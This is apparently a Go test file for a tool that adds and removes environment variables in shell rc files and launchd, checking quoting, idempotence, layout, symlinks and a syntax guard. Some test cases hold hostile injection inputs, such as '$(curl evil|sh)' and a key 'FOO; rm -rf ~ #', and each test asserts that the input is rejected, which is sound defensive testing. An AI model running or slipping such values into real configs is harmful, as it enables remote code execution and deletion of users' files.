package targets

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func newShell(t *testing.T, name, shell, content string) (*ShellTarget, string) {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if content != "" {
		if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return &ShellTarget{name: name, path: path, shell: shell}, path
}

func read(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// shellParses asserts the file is still valid syntax for its shell.
func shellParses(t *testing.T, shell, path string) {
	t.Helper()
	if _, err := exec.LookPath(shell); err != nil {
		t.Skipf("%s not installed", shell)
	}
	if out, err := exec.Command(shell, "-n", path).CombinedOutput(); err != nil {
		t.Fatalf("%s -n failed on result: %v\n%s\n--- file ---\n%s", shell, err, out, read(t, path))
	}
}

func TestEncodeExport(t *testing.T) {
	st := &ShellTarget{shell: "zsh"}
	cases := []struct {
		name, value string
		mode        QuoteMode
		want        string // "" => expect error
	}{
		{"bare", "/opt/java", QuoteExpand, `export K=/opt/java`},
		{"spaces", "a b", QuoteExpand, `export K="a b"`},
		{"var expands", "$HOME/bin", QuoteExpand, `export K="$HOME/bin"`},
		{"braced var", "${HOME}/x", QuoteExpand, `export K="${HOME}/x"`},
		{"tilde", "~/bin", QuoteExpand, `export K="$HOME/bin"`},
		{"double quote", `say "hi"`, QuoteExpand, `export K="say \"hi\""`},
		{"trailing backslash", `C:\`, QuoteExpand, `export K="C:\\"`},
		{"single quote", "it's", QuoteExpand, `export K="it's"`},
		{"glob", "*.x", QuoteExpand, `export K="*.x"`},
		{"cmd subst rejected", "$(curl x|sh)", QuoteExpand, ""},
		{"backtick rejected", "`id`", QuoteExpand, ""},
		{"newline rejected", "a\nb", QuoteExpand, ""},
		{"literal keeps $", "$HOME $(x)", QuoteLiteral, `export K='$HOME $(x)'`},
		{"literal single quote", "it's", QuoteLiteral, `export K='it'\''s'`},
		{"literal newline rejected", "a\nb", QuoteLiteral, ""},
		{"raw verbatim", "$(brew --prefix)", QuoteRaw, `export K=$(brew --prefix)`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, err := st.Preview("K", c.value, VarTypeExport, c.mode)
			if c.want == "" {
				if err == nil {
					t.Fatalf("expected error, got %q", got)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if got != c.want {
				t.Fatalf("got %s\nwant %s", got, c.want)
			}
		})
	}
}

// Every encoded value must survive a real shell round-trip unchanged
// (apart from intended $VAR expansion).
func TestEncodeRoundTripInZsh(t *testing.T) {
	if _, err := exec.LookPath("zsh"); err != nil {
		t.Skip("zsh not installed")
	}
	st := &ShellTarget{shell: "zsh"}
	values := []string{`plain`, `a b`, `say "hi"`, `C:\`, `back\slash`, `it's`, `*.x`, `a;b|c&d`, `<x>`, `!bang`}
	for _, v := range values {
		for _, mode := range []QuoteMode{QuoteExpand, QuoteLiteral} {
			line, err := st.Preview("K", v, VarTypeExport, mode)
			if err != nil {
				t.Fatalf("%q: %v", v, err)
			}
			out, err := exec.Command("zsh", "-fc", line+`; print -rn -- "$K"`).Output()
			if err != nil {
				t.Fatalf("%q (%s): zsh failed on %s: %v", v, mode, line, err)
			}
			if string(out) != v {
				t.Errorf("%q (%s): round-trip gave %q via %s", v, mode, out, line)
			}
		}
	}
}

func TestValidateKey(t *testing.T) {
	for _, k := range []string{"FOO", "_x", "A1_B"} {
		if err := ValidateKey(k); err != nil {
			t.Errorf("%q should be valid: %v", k, err)
		}
	}
	for _, k := range []string{"", "1A", "FOO BAR", "FOO;rm -rf ~ #", "A-B", "A=B"} {
		if err := ValidateKey(k); err == nil {
			t.Errorf("%q should be rejected", k)
		}
	}
	st, _ := newShell(t, ".zshrc", "zsh", "")
	if _, err := st.Add("FOO; rm -rf ~ #", "x", VarTypeExport, WriteOptions{}); err == nil {
		t.Fatal("Add must reject an injecting key")
	}
}

func TestDeletePreservesBlankLinesAndLayout(t *testing.T) {
	orig := "# header\n\nexport A=1\n\n\nexport FOO=bar\n\n# footer\n"
	st, path := newShell(t, ".zshrc", "zsh", orig)
	if _, err := st.Remove("FOO", RemoveOptions{}); err != nil {
		t.Fatal(err)
	}
	want := "# header\n\nexport A=1\n\n\n\n# footer\n"
	if got := read(t, path); got != want {
		t.Fatalf("got %q\nwant %q", got, want)
	}
}

func TestPreservesMissingTrailingNewlineAndCRLF(t *testing.T) {
	st, path := newShell(t, ".bashrc", "bash", "export A=1\r\nexport FOO=bar\r\nexport B=2")
	if _, err := st.Remove("FOO", RemoveOptions{}); err != nil {
		t.Fatal(err)
	}
	if got := read(t, path); got != "export A=1\r\nexport B=2" {
		t.Fatalf("got %q", got)
	}
}

func TestAddIsIdempotentAndUpdatesInPlace(t *testing.T) {
	st, path := newShell(t, ".zshenv", "zsh", "export A=1\nexport FOO=old\nexport B=2\n")

	res, err := st.Add("FOO", "new", VarTypeExport, WriteOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if res.Outcome != Updated || res.LineNum != 2 || strings.TrimSpace(res.Previous) != "export FOO=old" {
		t.Fatalf("unexpected result %+v", res)
	}
	if got := read(t, path); got != "export A=1\nexport FOO=new\nexport B=2\n" {
		t.Fatalf("got %q", got)
	}
	if res.Backup == "" || read(t, res.Backup) != "export A=1\nexport FOO=old\nexport B=2\n" {
		t.Fatalf("backup missing or wrong: %q", res.Backup)
	}

	res, err = st.Add("FOO", "new", VarTypeExport, WriteOptions{})
	if err != nil {
		t.Fatal(err)
	}
	if res.Outcome != Unchanged {
		t.Fatalf("second identical add should be a no-op, got %s", res.Outcome)
	}
	if got := read(t, path); strings.Count(got, "FOO") != 1 {
		t.Fatalf("duplicate written: %q", got)
	}

	// PATH entries: identical append is a no-op, a new dir appends.
	for i := 0; i < 2; i++ {
		if _, err := st.Add("PATH", "/opt/bin", VarTypePathAppend, WriteOptions{}); err != nil {
			t.Fatal(err)
		}
	}
	if got := read(t, path); strings.Count(got, "/opt/bin") != 1 {
		t.Fatalf("PATH entry duplicated: %q", got)
	}
	shellParses(t, "zsh", path)
}

func TestDryRunWritesNothing(t *testing.T) {
	orig := "export A=1\n"
	st, path := newShell(t, ".zshrc", "zsh", orig)
	if _, err := st.Add("B", "2", VarTypeExport, WriteOptions{DryRun: true}); err != nil {
		t.Fatal(err)
	}
	if _, err := st.Remove("A", RemoveOptions{DryRun: true}); err != nil {
		t.Fatal(err)
	}
	if got := read(t, path); got != orig {
		t.Fatalf("dry-run modified file: %q", got)
	}
}

func TestCommentModeSkipsAlreadyCommented(t *testing.T) {
	st, path := newShell(t, ".zshrc", "zsh", "# export FOO=1\n")
	res, err := st.Remove("FOO", RemoveOptions{Comment: true})
	if err != nil {
		t.Fatal(err)
	}
	if len(res.Affected) != 0 || res.Skipped != 1 {
		t.Fatalf("unexpected %+v", res)
	}
	if got := read(t, path); got != "# export FOO=1\n" {
		t.Fatalf("re-commented: %q", got)
	}
}

func TestRemovePathRequiresValue(t *testing.T) {
	orig := "export PATH=\"/opt/homebrew/bin:$PATH\"\nexport PATH=\"$PATH:/mine\"\n"
	st, path := newShell(t, ".zshenv", "zsh", orig)
	if _, err := st.Remove("PATH", RemoveOptions{}); err == nil {
		t.Fatal("bare PATH removal must be refused")
	}
	if _, err := st.Remove("PATH", RemoveOptions{Value: "/mine"}); err != nil {
		t.Fatal(err)
	}
	if got := read(t, path); got != "export PATH=\"/opt/homebrew/bin:$PATH\"\n" {
		t.Fatalf("got %q", got)
	}
}

func TestExportAndPathAppendRoundTrip(t *testing.T) {
	st, path := newShell(t, ".zshenv", "zsh", "export A=1\n")
	if _, err := st.Add("JAVA_HOME", "/opt/jdk/bin", VarTypeExportAndPathAppend, WriteOptions{}); err != nil {
		t.Fatal(err)
	}
	want := "export A=1\nexport JAVA_HOME=/opt/jdk/bin\nexport PATH=\"$PATH:$JAVA_HOME\"\n"
	if got := read(t, path); got != want {
		t.Fatalf("got %q", got)
	}
	if _, err := st.Remove("JAVA_HOME", RemoveOptions{}); err != nil {
		t.Fatal(err)
	}
	if got := read(t, path); got != "export A=1\n" {
		t.Fatalf("companion PATH line left behind: %q", got)
	}
}

func TestSymlinkAndModePreserved(t *testing.T) {
	dir := t.TempDir()
	real := filepath.Join(dir, "dotfiles", "zshrc")
	if err := os.MkdirAll(filepath.Dir(real), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(real, []byte("export A=1\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	link := filepath.Join(dir, ".zshrc")
	if err := os.Symlink(real, link); err != nil {
		t.Fatal(err)
	}
	st := &ShellTarget{name: "zshrc", path: link, shell: "zsh"}
	if _, err := st.Add("B", "2", VarTypeExport, WriteOptions{}); err != nil {
		t.Fatal(err)
	}
	if _, err := st.Remove("A", RemoveOptions{}); err != nil {
		t.Fatal(err)
	}
	fi, err := os.Lstat(link)
	if err != nil {
		t.Fatal(err)
	}
	if fi.Mode()&os.ModeSymlink == 0 {
		t.Fatal("symlink was replaced by a regular file")
	}
	if got := read(t, real); got != "export B=2\n" {
		t.Fatalf("real file content: %q", got)
	}
	rfi, _ := os.Stat(real)
	if rfi.Mode().Perm() != 0o600 {
		t.Fatalf("mode changed to %v", rfi.Mode().Perm())
	}
}

func TestSyntaxGuardBlocksBreakingEdit(t *testing.T) {
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not installed")
	}
	// --raw is unchecked, so only the syntax guard stops an unbalanced quote.
	orig := "export A=1\n"
	st, path := newShell(t, ".bashrc", "bash", orig)
	_, err := st.Add("FOO", `"unterminated`, VarTypeExport, WriteOptions{Quote: QuoteRaw})
	if err == nil || !strings.Contains(err.Error(), "would not parse") {
		t.Fatalf("expected syntax-guard refusal, got %v", err)
	}
	if got := read(t, path); got != orig {
		t.Fatalf("file modified despite refusal: %q", got)
	}
	// An already-broken file must still be editable.
	broken := "if true; then\nexport A=1\n"
	st2, path2 := newShell(t, ".zshrc", "zsh", broken)
	if _, err := st2.Add("B", "2", VarTypeExport, WriteOptions{}); err != nil {
		t.Fatalf("edit of pre-broken file should be allowed: %v", err)
	}
	if !strings.Contains(read(t, path2), "export B=2") {
		t.Fatal("B not written")
	}
}

func TestLaunchdRemoveCommentedThenDelete(t *testing.T) {
	lt, _ := NewLaunchdTarget(t.TempDir())
	if _, err := lt.Add("TEST_VAR", "v", VarTypeExport, WriteOptions{}); err != nil {
		t.Fatal(err)
	}
	if _, err := lt.Remove("TEST_VAR", RemoveOptions{Comment: true}); err != nil {
		t.Fatal(err)
	}
	// Commenting again is a no-op, not an error.
	res, err := lt.Remove("TEST_VAR", RemoveOptions{Comment: true})
	if err != nil || res.Skipped != 1 {
		t.Fatalf("re-comment: res=%+v err=%v", res, err)
	}
	if _, err := lt.Remove("TEST_VAR", RemoveOptions{}); err != nil {
		t.Fatalf("deleting a commented entry must work: %v", err)
	}
	if strings.Contains(read(t, lt.Path()), "TEST_VAR") {
		t.Fatal("entry not deleted")
	}
}

func TestLaunchdRejectsInjection(t *testing.T) {
	lt := &LaunchdTarget{}
	if _, err := lt.Preview("K", "$(curl evil|sh)", VarTypeExport, QuoteExpand); err == nil {
		t.Fatal("command substitution must be rejected")
	}
	got, err := lt.Preview("K", `a"b\`, VarTypeExport, QuoteExpand)
	if err != nil {
		t.Fatal(err)
	}
	if got != `launchctl setenv K "a\"b\\"` {
		t.Fatalf("got %s", got)
	}
}
